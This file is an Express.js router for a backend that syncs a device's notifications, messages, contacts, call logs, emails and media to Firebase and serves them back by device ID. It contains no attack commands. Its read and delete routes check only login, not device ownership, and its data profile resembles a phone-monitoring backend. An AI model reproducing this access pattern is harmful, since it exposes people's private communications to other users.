const express = require('express');
const router = express.Router();
const firebaseService = require('../services/firebaseService');
const { auth } = require('../middleware/auth');

// Sync notifications to Firebase
router.post('/sync/notifications', auth, async (req, res) => {
  try {
    const { notifications, deviceId } = req.body;
    
    if (!notifications || !Array.isArray(notifications)) {
      return res.status(400).json({ success: false, message: 'Invalid notifications data' });
    }

    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'Device ID is required' });
    }

    await firebaseService.syncNotifications(notifications, deviceId);
    
    res.json({ 
      success: true, 
      message: `Successfully synced ${notifications.length} notifications to Firebase`,
      syncedCount: notifications.length
    });
  } catch (error) {
    console.error('Firebase sync notifications error:', error);
    res.status(500).json({ success: false, message: 'Failed to sync notifications to Firebase' });
  }
});

// Sync messages to Firebase
router.post('/sync/messages', auth, async (req, res) => {
  try {
    const { messages, deviceId } = req.body;
    
    if (!messages || !Array.isArray(messages)) {
      return res.status(400).json({ success: false, message: 'Invalid messages data' });
    }

    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'Device ID is required' });
    }

    await firebaseService.syncMessages(messages, deviceId);
    
    res.json({ 
      success: true, 
      message: `Successfully synced ${messages.length} messages to Firebase`,
      syncedCount: messages.length
    });
  } catch (error) {
    console.error('Firebase sync messages error:', error);
    res.status(500).json({ success: false, message: 'Failed to sync messages to Firebase' });
  }
});

// Sync contacts to Firebase
router.post('/sync/contacts', auth, async (req, res) => {
  try {
    const { contacts, deviceId } = req.body;
    
    if (!contacts || !Array.isArray(contacts)) {
      return res.status(400).json({ success: false, message: 'Invalid contacts data' });
    }

    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'Device ID is required' });
    }

    await firebaseService.syncContacts(contacts, deviceId);
    
    res.json({ 
      success: true, 
      message: `Successfully synced ${contacts.length} contacts to Firebase`,
      syncedCount: contacts.length
    });
  } catch (error) {
    console.error('Firebase sync contacts error:', error);
    res.status(500).json({ success: false, message: 'Failed to sync contacts to Firebase' });
  }
});

// Sync call logs to Firebase
router.post('/sync/call-logs', auth, async (req, res) => {
  try {
    const { callLogs, deviceId } = req.body;
    
    if (!callLogs || !Array.isArray(callLogs)) {
      return res.status(400).json({ success: false, message: 'Invalid call logs data' });
    }

    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'Device ID is required' });
    }

    await firebaseService.syncCallLogs(callLogs, deviceId);
    
    res.json({ 
      success: true, 
      message: `Successfully synced ${callLogs.length} call logs to Firebase`,
      syncedCount: callLogs.length
    });
  } catch (error) {
    console.error('Firebase sync call logs error:', error);
    res.status(500).json({ success: false, message: 'Failed to sync call logs to Firebase' });
  }
});

// Sync emails to Firebase
router.post('/sync/emails', auth, async (req, res) => {
  try {
    const { emails, deviceId } = req.body;
    
    if (!emails || !Array.isArray(emails)) {
      return res.status(400).json({ success: false, message: 'Invalid emails data' });
    }

    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'Device ID is required' });
    }

    await firebaseService.syncEmails(emails, deviceId);
    
    res.json({ 
      success: true, 
      message: `Successfully synced ${emails.length} emails to Firebase`,
      syncedCount: emails.length
    });
  } catch (error) {
    console.error('Firebase sync emails error:', error);
    res.status(500).json({ success: false, message: 'Failed to sync emails to Firebase' });
  }
});

// Sync media files to Firebase Storage
router.post('/sync/media', auth, async (req, res) => {
  try {
    const { mediaFiles, deviceId } = req.body;
    
    if (!mediaFiles || !Array.isArray(mediaFiles)) {
      return res.status(400).json({ success: false, message: 'Invalid media files data' });
    }

    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'Device ID is required' });
    }

    await firebaseService.syncMedia(mediaFiles, deviceId);
    
    res.json({ 
      success: true, 
      message: `Successfully synced ${mediaFiles.length} media files to Firebase`,
      syncedCount: mediaFiles.length
    });
  } catch (error) {
    console.error('Firebase sync media error:', error);
    res.status(500).json({ success: false, message: 'Failed to sync media to Firebase' });
  }
});

// Update device status
router.post('/device/status', auth, async (req, res) => {
  try {
    const { deviceId, status } = req.body;
    
    if (!deviceId || !status) {
      return res.status(400).json({ success: false, message: 'Device ID and status are required' });
    }

    await firebaseService.updateDeviceStatus(deviceId, status);
    
    res.json({ 
      success: true, 
      message: 'Device status updated successfully'
    });
  } catch (error) {
    console.error('Firebase update device status error:', error);
    res.status(500).json({ success: false, message: 'Failed to update device status' });
  }
});

// Get real-time updates for a device
router.get('/realtime/:deviceId', auth, async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'Device ID is required' });
    }

    const updates = await firebaseService.getRealTimeUpdates(deviceId);
    
    res.json({ 
      success: true, 
      data: updates
    });
  } catch (error) {
    console.error('Firebase get real-time updates error:', error);
    res.status(500).json({ success: false, message: 'Failed to get real-time updates' });
  }
});

// Get data from Firebase
router.get('/data/:collection/:deviceId', auth, async (req, res) => {
  try {
    const { collection, deviceId } = req.params;
    const { limit = 100 } = req.query;
    
    if (!collection || !deviceId) {
      return res.status(400).json({ success: false, message: 'Collection and device ID are required' });
    }

    const data = await firebaseService.getData(collection, deviceId, parseInt(limit));
    
    res.json({ 
      success: true, 
      data,
      count: data.length
    });
  } catch (error) {
    console.error('Firebase get data error:', error);
    res.status(500).json({ success: false, message: 'Failed to get data from Firebase' });
  }
});

// Delete data from Firebase
router.delete('/data/:collection/:deviceId', auth, async (req, res) => {
  try {
    const { collection, deviceId } = req.params;
    
    if (!collection || !deviceId) {
      return res.status(400).json({ success: false, message: 'Collection and device ID are required' });
    }

    await firebaseService.deleteData(collection, deviceId);
    
    res.json({ 
      success: true, 
      message: `Successfully deleted data from ${collection} for device ${deviceId}`
    });
  } catch (error) {
    console.error('Firebase delete data error:', error);
    res.status(500).json({ success: false, message: 'Failed to delete data from Firebase' });
  }
});

// Send push notification
router.post('/push-notification', auth, async (req, res) => {
  try {
    const { deviceToken, notification } = req.body;
    
    if (!deviceToken || !notification) {
      return res.status(400).json({ success: false, message: 'Device token and notification are required' });
    }

    const response = await firebaseService.sendPushNotification(deviceToken, notification);
    
    res.json({ 
      success: true, 
      message: 'Push notification sent successfully',
      response
    });
  } catch (error) {
    console.error('Firebase send push notification error:', error);
    res.status(500).json({ success: false, message: 'Failed to send push notification' });
  }
});

// Get sync status for a device
router.get('/sync-status/:deviceId', auth, async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'Device ID is required' });
    }

    const { rtdb } = require('../config/firebase');
    const snapshot = await rtdb.ref(`sync_status/${deviceId}`).once('value');
    const syncStatus = snapshot.val() || {};
    
    res.json({ 
      success: true, 
      data: syncStatus
    });
  } catch (error) {
    console.error('Firebase get sync status error:', error);
    res.status(500).json({ success: false, message: 'Failed to get sync status' });
  }
});

// Bulk sync all data types
router.post('/sync/bulk', auth, async (req, res) => {
  try {
    const { deviceId, data } = req.body;
    
    if (!deviceId || !data) {
      return res.status(400).json({ success: false, message: 'Device ID and data are required' });
    }

    const results = {};
    const syncPromises = [];

    // Sync notifications
    if (data.notifications && Array.isArray(data.notifications)) {
      syncPromises.push(
        firebaseService.syncNotifications(data.notifications, deviceId)
          .then(() => { results.notifications = data.notifications.length; })
          .catch(err => { results.notifications = { error: err.message }; })
      );
    }

    // Sync messages
    if (data.messages && Array.isArray(data.messages)) {
      syncPromises.push(
        firebaseService.syncMessages(data.messages, deviceId)
          .then(() => { results.messages = data.messages.length; })
          .catch(err => { results.messages = { error: err.message }; })
      );
    }

    // Sync contacts
    if (data.contacts && Array.isArray(data.contacts)) {
      syncPromises.push(
        firebaseService.syncContacts(data.contacts, deviceId)
          .then(() => { results.contacts = data.contacts.length; })
          .catch(err => { results.contacts = { error: err.message }; })
      );
    }

    // Sync call logs
    if (data.callLogs && Array.isArray(data.callLogs)) {
      syncPromises.push(
        firebaseService.syncCallLogs(data.callLogs, deviceId)
          .then(() => { results.callLogs = data.callLogs.length; })
          .catch(err => { results.callLogs = { error: err.message }; })
      );
    }

    // Sync emails
    if (data.emails && Array.isArray(data.emails)) {
      syncPromises.push(
        firebaseService.syncEmails(data.emails, deviceId)
          .then(() => { results.emails = data.emails.length; })
          .catch(err => { results.emails = { error: err.message }; })
      );
    }

    await Promise.all(syncPromises);
    
    res.json({ 
      success: true, 
      message: 'Bulk sync completed',
      results
    });
  } catch (error) {
    console.error('Firebase bulk sync error:', error);
    res.status(500).json({ success: false, message: 'Failed to perform bulk sync' });
  }
});

module.exports = router; 